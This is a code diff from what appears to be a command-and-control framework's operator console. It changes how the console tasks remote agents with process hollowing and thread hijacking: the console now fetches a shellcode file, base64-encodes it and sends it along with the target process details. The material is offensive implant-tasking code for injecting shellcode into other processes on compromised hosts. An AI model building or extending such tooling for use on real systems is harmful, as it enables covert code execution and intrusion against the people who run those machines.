@@ -10002,14 +10002,16 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
           '', null);
         return;
       }
-      // If one arg: shellcode. If two: target + shellcode.
+      // If one arg: payload only. If two: target + payload.
       const hTarget = hp.length >= 2 ? hp[0] : '';
       const hPayload = hp.length >= 2 ? hp[1] : hp[0];
-      taskType = 'HOLLOW';
-      taskArgs = hTarget;
-      // payload is the shellcode filename — server will load it
-      // We encode as JSON for target, payload via standard Payload field
-      taskArgs = JSON.stringify({target: hTarget, payload: hPayload});
+      addConsoleOutput(`[*] Fetching ${hPayload}…`, '', null);
+      try {
+        const sc = await fetchSCFile(hPayload);
+        payload  = u8ToB64(sc);
+        taskType = 'HOLLOW';
+        taskArgs = hTarget;
+      } catch(e) { addConsoleOutput('', 'hollow error: '+e.message, null); return; }
       break;
     }
 
@@ -10362,7 +10364,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
         const sc = await fetchSCFile(thFile);
         payload  = u8ToB64(sc);
         taskType = 'THREAD_HIJACK';
-        taskArgs = thPid;
+        taskArgs = JSON.stringify({pid: parseInt(thPid, 10)});
       } catch(e) { addConsoleOutput('', 'thread-hijack error: '+e.message, null); return; }
       break;
     }
